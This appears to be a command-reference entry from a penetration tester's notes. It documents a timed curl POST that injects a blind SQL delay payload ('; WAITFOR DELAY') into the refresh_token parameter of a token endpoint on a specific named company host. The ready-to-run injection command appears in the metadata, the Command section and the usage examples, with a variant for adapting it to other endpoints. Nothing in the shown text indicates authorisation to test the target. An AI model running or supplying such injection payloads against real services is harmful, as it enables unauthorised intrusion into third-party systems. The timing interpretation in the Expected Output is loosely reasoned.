---
data: >-
  time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept:
  application/json" -H "Content-Type: application/x-www-form-urlencoded" -d
  "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
tags:
  - sqli
  - http-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.827Z'
id: f403ef17-b119-4655-8612-1e0f50947d6a
verified: false
validated: true
submitted: true
---
# curl-baseline-delay

## Command

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
```

## Description

This command sends a timed POST request to test for blind SQL injection using a 1-second delay payload in the refresh_token parameter, useful for establishing baseline timing in web vulnerability assessment.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Measures real execution time of the curl command | Yes |
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `"https://tsftp.informatica.com/api/v1/token"` | Target endpoint URL | Yes |
| `-H "accept: application/json"` | Requests JSON response format | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Sets body encoding for form data | Yes |
| `-d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"` | Payload with SQL injection in refresh_token | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
```

### Advanced Usage

Adapt the URL and payload for similar endpoints:

```bash
time curl -X POST "https://example.com/api/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:1'--"
```

## Expected Output

JSON response {"error":"invalid_grant"} prefixed with timing info like "real 0m2.048s", indicating a 1-second SQL delay.

## Related

- [[commands/curl-extended-delay]]
- [[procedures/Test-Baseline-Response-Delay-with-SQL-Injection]]
